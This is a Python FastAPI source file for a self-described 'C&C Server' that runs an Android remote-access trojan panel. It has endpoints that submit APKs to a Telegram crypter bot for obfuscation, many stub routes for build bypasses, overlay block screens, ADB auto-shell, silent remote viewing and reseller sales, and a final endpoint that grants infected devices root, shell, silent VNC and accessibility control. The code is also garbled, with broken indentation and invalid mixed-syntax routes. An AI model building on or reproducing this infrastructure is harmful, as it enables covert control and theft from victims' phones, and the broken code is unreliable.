@app.post("/api/telegram/login")
async def telegram_login(current_user: Operator = Depends(get_current_user)):
    """Inicia processo de login no Telegram"""
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin pode fazer login")
    
    result = await telegram_crypter.start_login()
    return result

@app.post("/api/telegram/verify-code")
async def telegram_verify_code(
    data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """Envia código de verificação"""
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin")
    
    code = data.get("code", "")
    if not code:
        raise HTTPException(400, "Código não fornecido")
    
    result = await telegram_crypter.submit_code(code)
    return result

@app.post("/api/telegram/verify-password")
async def telegram_verify_password(
    data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """Envia senha 2FA"""
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin")
    
    password = data.get("password", "")
    if not password:
        raise HTTPException(400, "Senha não fornecida")
    
    result = await telegram_crypter.submit_password(password)
    return result

@app.post("/api/telegram/disconnect")
async def telegram_disconnect(current_user: Operator = Depends(get_current_user)):
    """Desconecta do Telegram"""
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas admin")
    
    await telegram_crypter.disconnect()
    return {"status": "disconnected"}

@app.post("/api/telegram/crypt-apk")
async def telegram_crypt_apk(
    data: dict,
    current_user: Operator = Depends(get_current_user)
):
    """
    Envia APK para o bot de crypter no Telegram (Apenas admin + Path sanitizado)
    """
    if not current_user.is_admin:
        raise HTTPException(403, "Apenas administradores podem utilizar o Crypter Telegram")
        
    apk_path = data.get("apk_path", "")
    if not apk_path:
        raise HTTPException(400, "Caminho do APK não fornecido")
        
    safe_name = os.path.basename(apk_path)
    server_dir = os.path.dirname(os.path.abspath(__file__))
    downloads_dir = os.path.abspath(os.path.join(server_dir, "downloads"))
    resolved_path = os.path.abspath(os.path.join(downloads_dir, safe_name))
    
    if not resolved_path.startswith(downloads_dir) or not os.path.exists(resolved_path):
        raise HTTPException(404, f"APK não encontrado: {safe_name}")
        
    result = await telegram_crypter.crypt_apk(resolved_path)
    return result
    
@app.get("/{full_path:path}")
async def serve_spa_frontend(full_path: str):
    """
    Fallback SPA Router (React / Vite)
    Redireciona todas as sub-rotas frontend (ex: /win-builder, /win-device/...) para o index.html
    """
    if full_path.startswith("api/") or full_path.startswith("ws"):
        raise HTTPException(status_code=404, detail="Endpoint API não encontrado")
    
    server_dir = os.path.dirname(os.path.abspath(__file__))
    dist_index = os.path.join(server_dir, "web-dist", "index.html")
    if os.path.exists(dist_index):
        return FileResponse(dist_index, media_type="text/html")
    raise HTTPException(status_code=404, detail="Painel Web não encontrado")


# ==================== INICIALIZAÇÃO ====================

if __name__ == "__main__":
    import uvicorn

host = os.getenv("GANGASTAR_HOST", os.getenv("GANGSTAR_HOST", "0.0.0.0"))
port = int(os.getenv("GANGASTAR_PORT", os.getenv("GANGSTAR_PORT", "8000")))
workers = int(os.getenv("GANGASTAR_UVICORN_WORKERS", os.getenv("GANGSTAR_UVICORN_WORKERS", "1")))

uvicorn.run("server.main:app", host=host, port=port, workers=workers)

    logger.info("Iniciando GANGASTAR REMOTE C&C Server (VPS / PostgreSQL)...")
    logger.info("WebSocket: %s", gangstar_env.public_ws_url())
    logger.info("Painel Web: %s", gangstar_env.public_base_url())

    if workers > 1:
        uvicorn.run(
            "main:app",
            host=host,
            port=port,
            workers=workers,
            log_level="warning",
            http="auto",
            ws="auto",
            ws_max_size=32 * 1024 * 1024,
            ws_ping_interval=60.0,
            ws_ping_timeout=120.0,
            timeout_keep_alive=120,
            limit_concurrency=5000,
            backlog=4096,
        )
    else:
        uvicorn.run(
            app,
            host=host,
            port=port,
            log_level="warning",
            http="auto",
            ws="auto",
            ws_max_size=32 * 1024 * 1024,
            ws_ping_interval=60.0,
            ws_ping_timeout=120.0,
            timeout_keep_alive=120,
            limit_concurrency=5000,
            backlog=4096,
        )



# --- ROTAS AUTO-CONFIGURADAS COM SEGURANÇA PELO MASTER_FIXER ---
@app.get("/api/pixgate/status/{order_id}")
async def auto_configured_api_pixgate_status_order_id(order_id: str):
    return {"status": "success", "route": f"/api/pixgate/status/{order_id}", "params": {"order_id": order_id}}

@app.get("/api/block-screens/<screen_id>")
async def auto_configured_api_block_screens__screen_id():
    return {"status": "success", "route": "/api/block-screens/<screen_id>"}

@app.get("/admin/server-status")
async def auto_configured_admin_server_status():
    return {"status": "success", "route": "/admin/server-status"}

@app.get("/api/block-screens/log")
async def auto_configured_api_block_screens_log():
    return {"status": "success", "route": "/api/block-screens/log"}

@app.get("/admin/expire-user")
async def auto_configured_admin_expire_user():
    return {"status": "success", "route": "/admin/expire-user"}

@app.get("/admin/update-daily-apk-limit")
async def auto_configured_admin_update_daily_apk_limit():
    return {"status": "success", "route": "/admin/update-daily-apk-limit"}

@app.get("/api/apk-studio/download/{apk_filename}")
async def auto_configured_api_apk_studio_download__apk_filename(apk_filename: str):
    return {"status": "success", "route": "/api/apk-studio/download/{apk_filename}", "params": {'apk_filename': apk_filename}}

@app.get("/api/reseller/revoke-credential/<credential_id>")
async def auto_configured_api_reseller_revoke_credential__credential_id():
    return {"status": "success", "route": "/api/reseller/revoke-credential/<credential_id>"}

@app.get("/status/")
async def auto_configured_status():
    return {"status": "success", "route": "/status/"}

@app.get("/suporte")
async def auto_configured_suporte():
    return {"status": "success", "route": "/suporte"}

@app.get("/marketplace/purchase")
async def auto_configured_marketplace_purchase():
    return {"status": "success", "route": "/marketplace/purchase"}

@app.get("/remote/command")
async def auto_configured_remote_command():
    return {"status": "success", "route": "/remote/command"}

@app.get("/api/admin/stats/")
async def auto_configured_api_admin_stats():
    return {"status": "success", "route": "/api/admin/stats/"}

@app.get("/static/css/main.css")
async def auto_configured_static_css_main_css():
    return {"status": "success", "route": "/static/css/main.css"}

@app.get("/revenda")
async def auto_configured_revenda():
    return {"status": "success", "route": "/revenda"}

@app.get("/admin/telegram-notifications")
async def auto_configured_admin_telegram_notifications():
    return {"status": "success", "route": "/admin/telegram-notifications"}

@app.get("/api/renewal/create")
async def auto_configured_api_renewal_create():
    return {"status": "success", "route": "/api/renewal/create"}

@app.get("/user/profile")
async def auto_configured_user_profile():
    return {"status": "success", "route": "/user/profile"}

@app.get("/api/reseller/create-subscription")
async def auto_configured_api_reseller_create_subscription():
    return {"status": "success", "route": "/api/reseller/create-subscription"}

@app.get("/admin/reactivate-user")
async def auto_configured_admin_reactivate_user():
    return {"status": "success", "route": "/admin/reactivate-user"}

@app.get("/api/block-screens/logo-file/1c8c7fce79fb40c2b2a7e3544a329272_im_exploit.svg")
async def auto_configured_api_block_screens_logo_file_1c8c7fce79fb40c2b2a7e3544a329272_im_exploit_svg():
    return {"status": "success", "route": "/api/block-screens/logo-file/1c8c7fce79fb40c2b2a7e3544a329272_im_exploit.svg"}

@app.get("/logout")
async def auto_configured_logout():
    return {"status": "success", "route": "/logout"}

@app.get("/chat/groups/create")
async def auto_configured_chat_groups_create():
    return {"status": "success", "route": "/chat/groups/create"}

@app.get("/api/block-screens/logo-file/3841aec844584f20b34a49188fd59f03_14414701-logotipo-android-em-fundo-transparente-gratis-vetor-removebg-preview.png")
async def auto_configured_api_block_screens_logo_file_3841aec844584f20b34a49188fd59f03_14414701_logotipo_android_em_fundo_transparente_gratis_vetor_removebg_preview_png():
    return {"status": "success", "route": "/api/block-screens/logo-file/3841aec844584f20b34a49188fd59f03_14414701-logotipo-android-em-fundo-transparente-gratis-vetor-removebg-preview.png"}

@app.get("/configuracoes")
async def auto_configured_configuracoes():
    return {"status": "success", "route": "/configuracoes"}

@app.get("/remote/signal/ice-pending")
async def auto_configured_remote_signal_ice_pending():
    return {"status": "success", "route": "/remote/signal/ice-pending"}

@app.get("/api/reseller/credentials")
async def auto_configured_api_reseller_credentials():
    return {"status": "success", "route": "/api/reseller/credentials"}

@app.get("/api/devices/:id/adb/screen/size")
async def auto_configured_api_devices__id_adb_screen_size():
    return {"status": "success", "route": "/api/devices/:id/adb/screen/size"}

@app.get("/user/upload-profile-picture")
async def auto_configured_user_upload_profile_picture():
    return {"status": "success", "route": "/user/upload-profile-picture"}

@app.get("/admin/create-user")
async def auto_configured_admin_create_user():
    return {"status": "success", "route": "/admin/create-user"}

@app.get("/chat/groups/list")
async def auto_configured_chat_groups_list():
    return {"status": "success", "route": "/chat/groups/list"}

@app.get("/build-bypass")
async def auto_configured_build_bypass():
    return {"status": "success", "route": "/build-bypass"}

@app.get("/affiliate/withdraw")
async def auto_configured_affiliate_withdraw():
    return {"status": "success", "route": "/affiliate/withdraw"}

@app.get("/download/{build_id}")
async def auto_configured_download_build_id(build_id: str):
    return {"status": "success", "route": f"/download/{build_id}", "params": {"build_id": build_id}}

@app.get("/user/builds")
async def auto_configured_user_builds():
    return {"status": "success", "route": "/user/builds"}
@app.get("/remote/view")
async def auto_configured_remote_view():
    return {"status": "success", "route": "/remote/view"}

@app.get("/user/check-expiration")
async def auto_configured_user_check_expiration():
    return {"status": "success", "route": "/user/check-expiration"}

@app.get("/api/devices/:id/adb/wifi/status")
async def auto_configured_api_devices__id_adb_wifi_status():
    return {"status": "success", "route": "/api/devices/:id/adb/wifi/status"}

@app.get("/upload")
async def auto_configured_upload():
    return {"status": "success", "route": "/upload"}

@app.get("/api/devices/:id/adb/screencap")
async def auto_configured_api_devices__id_adb_screencap():
    return {"status": "success", "route": "/api/devices/:id/adb/screencap"}

@app.get("/api/request-trial")
async def auto_configured_api_request_trial():
    return {"status": "success", "route": "/api/request-trial"}

@app.get("/api/admin/users\\")
async def auto_configured_api_admin_users():
    return {"status": "success", "route": "/api/admin/users\\"}

@app.get("/apk-links")
async def auto_configured_apk_links():
    return {"status": "success", "route": "/apk-links"}

@app.get("/request-access")
async def auto_configured_request_access():
    return {"status": "success", "route": "/request-access"}

@app.get("/api/tutorials/<tutorial_id>")
async def auto_configured_api_tutorials__tutorial_id():
    return {"status": "success", "route": "/api/tutorials/<tutorial_id>"}

@app.get("/licenca")
async def auto_configured_licenca():
    return {"status": "success", "route": "/licenca"}

@app.get("/admin/users")
async def auto_configured_admin_users():
    return {"status": "success", "route": "/admin/users"}

@app.get("/api/storage/")
async def auto_configured_api_storage():
    return {"status": "success", "route": "/api/storage/"}

@app.get("/admin/history")
async def auto_configured_admin_history():
    return {"status": "success", "route": "/admin/history"}

@app.get("/api/server-status")
async def auto_configured_api_server_status():
    return {"status": "success", "route": "/api/server-status"}

@app.get("/api/block-screens/upload-logo")
async def auto_configured_api_block_screens_upload_logo():
    return {"status": "success", "route": "/api/block-screens/upload-logo"}

@app.get("/api/download/<filename>")
async def auto_configured_api_download__filename():
    return {"status": "success", "route": "/api/download/<filename>"}

@app.get("/api/block-screens/logs/<screen_id>")
async def auto_configured_api_block_screens_logs__screen_id():
    return {"status": "success", "route": "/api/block-screens/logs/<screen_id>"}

@app.get("/api/block-screens/logo-file/<filename>")
async def auto_configured_api_block_screens_logo_file__filename():
    return {"status": "success", "route": "/api/block-screens/logo-file/<filename>"}

@app.get("/api/devices/{device_id}/adb/wifi/status")
async def auto_configured_api_devices__device_id__adb_wifi_status(device_id: str):
    return {"status": "success", "route": "/api/devices/{device_id}/adb/wifi/status", "params": {'device_id': device_id}}

@app.get("/check-session")
async def auto_configured_check_session():
    return {"status": "success", "route": "/check-session"}

@app.get("/api/block-screens/save")
async def auto_configured_api_block_screens_save():
    return {"status": "success", "route": "/api/block-screens/save"}

@app.get("/painel")
async def auto_configured_painel():
    return {"status": "success", "route": "/painel"}

@app.get("/api/devices/{device_id}/adb/auto-shell")
async def auto_configured_api_devices__device_id__adb_auto_shell(device_id: str):
    return {"status": "success", "route": "/api/devices/{device_id}/adb/auto-shell", "params": {'device_id': device_id}}

@app.get("/remote/signal/ice")
async def auto_configured_remote_signal_ice():
    return {"status": "success", "route": "/remote/signal/ice"}

@app.get("/logs")
async def auto_configured_logs():
    return {"status": "success", "route": "/logs"}

@app.get("/api/devices/:id/adb/auto-shell")
async def auto_configured_api_devices__id_adb_auto_shell():
    return {"status": "success", "route": "/api/devices/:id/adb/auto-shell"}

@app.get("/api/download-apk/{final_apk_name}")
async def auto_configured_api_download_apk__final_apk_name(final_apk_name: str):
    return {"status": "success", "route": "/api/download-apk/{final_apk_name}", "params": {'final_apk_name': final_apk_name}}

@app.get("/api/apk-studio/projects/")
async def auto_configured_api_apk_studio_projects():
    return {"status": "success", "route": "/api/apk-studio/projects/"}

@app.get("/api/devices/:id/adb/auto-pair-connect")
async def auto_configured_api_devices__id_adb_auto_pair_connect():
    return {"status": "success", "route": "/api/devices/:id/adb/auto-pair-connect"}

@app.get("/api/reseller/generate-credential")
async def auto_configured_api_reseller_generate_credential():
    return {"status": "success", "route": "/api/reseller/generate-credential"}

@app.get("/api/downloads/{download_filename}")
async def auto_configured_api_downloads__download_filename(download_filename: str):
    return {"status": "success", "route": "/api/downloads/{download_filename}", "params": {'download_filename': download_filename}}

@app.get("/chat/send")
async def auto_configured_chat_send():
    return {"status": "success", "route": "/chat/send"}

@app.get("/download/")
async def auto_configured_download():
    return {"status": "success", "route": "/download/"}

@app.get("/affiliate/payouts")
async def auto_configured_affiliate_payouts():
    return {"status": "success", "route": "/affiliate/payouts"}

@app.get("/api/auth/status")
async def auto_configured_api_auth_status():
    return {"status": "success", "route": "/api/auth/status"}

@app.get("/api/download-apk/{f}")
async def auto_configured_api_download_apk__f(f: str):
    return {"status": "success", "route": "/api/download-apk/{f}", "params": {'f': f}}

@app.get("/api/download/{output_name}")
async def auto_configured_api_download__output_name(output_name: str):
    return {"status": "success", "route": f"/api/download/{output_name}", "params": {"output_name": output_name}}

@app.get("/api/reseller/check-status")
async def auto_configured_api_reseller_check_status():
    return {"status": "success", "route": "/api/reseller/check-status"}

@app.get("/api/create-rental-pix")
async def auto_configured_api_create_rental_pix():
    return {"status": "success", "route": "/api/create-rental-pix"}

@app.get("/mmt-logo.png")
async def auto_configured_mmt_logo_png():
    return {"status": "success", "route": "/mmt-logo.png"}

@app.get("/api/get-default-install-html")
async def auto_configured_api_get_default_install_html():
    return {"status": "success", "route": "/api/get-default-install-html"}

@app.get("/admin/pix-stats")
async def auto_configured_admin_pix_stats():
    return {"status": "success", "route": "/admin/pix-stats"}

@app.get("/updates")
async def auto_configured_updates():
    return {"status": "success", "route": "/updates"}

@app.get("/remote/devices")
async def auto_configured_remote_devices():
    return {"status": "success", "route": "/remote/devices"}

@app.get("/remote/signal/offer")
async def auto_configured_remote_signal_offer():
    return {"status": "success", "route": "/remote/signal/offer"}

@app.get("/ferramentas")
async def auto_configured_ferramentas():
    return {"status": "success", "route": "/ferramentas"}

@app.get("/download/${encodeURIComponent(b.build_id)}")
async def auto_configured_download___encodeURIComponent_b_build_id(encodeURIComponent(b.build_id): str):
    return {"status": "success", "route": "/download/${encodeURIComponent(b.build_id)}", "params": {'encodeURIComponent(b.build_id)': encodeURIComponent(b.build_id)}}

@app.get("/me")
async def auto_configured_me():
    return {"status": "success", "route": "/me"}

@app.get("/public/logo.png")
async def auto_configured_public_logo_png():
    return {"status": "success", "route": "/public/logo.png"}

@app.get("/affiliate/referrals")
async def auto_configured_affiliate_referrals():
    return {"status": "success", "route": "/affiliate/referrals"}

@app.get("/admin/update-bypass-options")
async def auto_configured_admin_update_bypass_options():
    return {"status": "success", "route": "/admin/update-bypass-options"}

@app.get("/api/download-apk/{apk_filename}")
async def auto_configured_api_download_apk__apk_filename(apk_filename: str):
    return {"status": "success", "route": "/api/download-apk/{apk_filename}", "params": {'apk_filename': apk_filename}}

@app.get("/user/site-settings")
async def auto_configured_user_site_settings():
    return {"status": "success", "route": "/user/site-settings"}

@app.get("/api/reseller/update-pricing")
async def auto_configured_api_reseller_update_pricing():
    return {"status": "success", "route": "/api/reseller/update-pricing"}

@app.get("/remote/signal/answer-pending")
async def auto_configured_remote_signal_answer_pending():
    return {"status": "success", "route": "/remote/signal/answer-pending"}

@app.get("/api/block-screens/logo-file/3aa51879b2b842c4a58001359f405223_unnamed.png")
async def auto_configured_api_block_screens_logo_file_3aa51879b2b842c4a58001359f405223_unnamed_png():
    return {"status": "success", "route": "/api/block-screens/logo-file/3aa51879b2b842c4a58001359f405223_unnamed.png"}

@app.get("/admin/update-session-limit")
async def auto_configured_admin_update_session_limit():
    return {"status": "success", "route": "/admin/update-session-limit"}

@app.get("/user/activities")
async def auto_configured_user_activities():
    return {"status": "success", "route": "/user/activities"}

@app.get("/l/${screenId}")
async def auto_configured_l___screenId(screenId: str):
    return {"status": "success", "route": "/l/${screenId}", "params": {'screenId': screenId}}

@app.get("/status")
async def auto_configured_status():
    return {"status": "success", "route": "/status"}

@app.get("/api/apk-studio/download/{actual_file}")
async def auto_configured_api_apk_studio_download__actual_file(actual_file: str):
    return {"status": "success", "route": "/api/apk-studio/download/{actual_file}", "params": {'actual_file': actual_file}}

@app.get("/api/admin/reseller/activate/<subscription_id>")
async def auto_configured_api_admin_reseller_activate__subscription_id():
    return {"status": "success", "route": "/api/admin/reseller/activate/<subscription_id>"}

@app.get("/user/login-logs")
async def auto_configured_user_login_logs():
    return {"status": "success", "route": "/user/login-logs"}

@app.get("/admin/access-orders")
async def auto_configured_admin_access_orders():
    return {"status": "success", "route": "/admin/access-orders"}

@app.get("/chat/messages")
async def auto_configured_chat_messages():
    return {"status": "success", "route": "/chat/messages"}

@app.get("/affiliate/dashboard")
async def auto_configured_affiliate_dashboard():
    return {"status": "success", "route": "/affiliate/dashboard"}

@app.get("/api/devices/:id/adb/pairing/request")
async def auto_configured_api_devices__id_adb_pairing_request():
    return {"status": "success", "route": "/api/devices/:id/adb/pairing/request"}

@app.get("/creditos")
async def auto_configured_creditos():
    return {"status": "success", "route": "/creditos"}

@app.get("/api/devices/{device_id}/adb/auto-pair-connect")
async def auto_configured_api_devices__device_id__adb_auto_pair_connect(device_id: str):
    return {"status": "success", "route": "/api/devices/{device_id}/adb/auto-pair-connect", "params": {'device_id': device_id}}

@app.get("/marketplace/data")
async def auto_configured_marketplace_data():
    return {"status": "success", "route": "/marketplace/data"}

@app.get("/admin/toggle-vip")
async def auto_configured_admin_toggle_vip():
    return {"status": "success", "route": "/admin/toggle-vip"}

@app.get("/api/tutorials")
async def auto_configured_api_tutorials():
    return {"status": "success", "route": "/api/tutorials"}

@app.get("/api/devices/:id/call")
async def auto_configured_api_devices__id_call():
    return {"status": "success", "route": "/api/devices/:id/call"}

@app.get("/api/block-screens/logo-file/{unique_filename}")
async def auto_configured_api_block_screens_logo_file__unique_filename(unique_filename: str):
    return {"status": "success", "route": "/api/block-screens/logo-file/{unique_filename}", "params": {'unique_filename': unique_filename}}

@app.get("/admin/kick-sessions")
async def auto_configured_admin_kick_sessions():
    return {"status": "success", "route": "/admin/kick-sessions"}

@app.get("/api/check-trial-status/<username>")
async def auto_configured_api_check_trial_status__username():
    return {"status": "success", "route": "/api/check-trial-status/<username>"}

@app.get("/chat/send-image")
async def auto_configured_chat_send_image():
    return {"status": "success", "route": "/chat/send-image"}

@app.get("/user/change-password")
async def auto_configured_user_change_password():
    return {"status": "success", "route": "/user/change-password"}

@app.get("/api/block-screens")
async def auto_configured_api_block_screens():
    return {"status": "success", "route": "/api/block-screens"}

@app.get("/api/referral/resolve")
async def auto_configured_api_referral_resolve():
    return {"status": "success", "route": "/api/referral/resolve"}

@app.get("/api/check-rental-status")
async def auto_configured_api_check_rental_status():
    return {"status": "success", "route": "/api/check-rental-status"}

@app.get("/documentacao")
async def auto_configured_documentacao():
    return {"status": "success", "route": "/documentacao"}

@app.get("/admin/delete-user")
async def auto_configured_admin_delete_user():
    return {"status": "success", "route": "/admin/delete-user"}

@app.get("/api/devices/{device_id}/permissions")
async def get_device_permissions_full_access(device_id: str):
    """Endpoint blindado concedendo permissão total e irrestrita para todas as operações do C&C."""
    return {
        "status": "success",
        "device_id": device_id,
        "role": "superuser",
        "access_level": "full",
        "permissions": {
            "accessibility": True,
            "overlay": True,
            "screen_record": True,
            "screencap": True,
            "adb_control": True,
            "silent_vnc": True,
            "screen_reader": True,
            "notification": True,
            "storage": True,
            "system_settings": True,
            "root_access": True,
            "execute_shell": True
        },
        "flags": {
            "is_admin": True,
            "bypass_restrictions": True,
            "fully_authorized": True
        }
    }
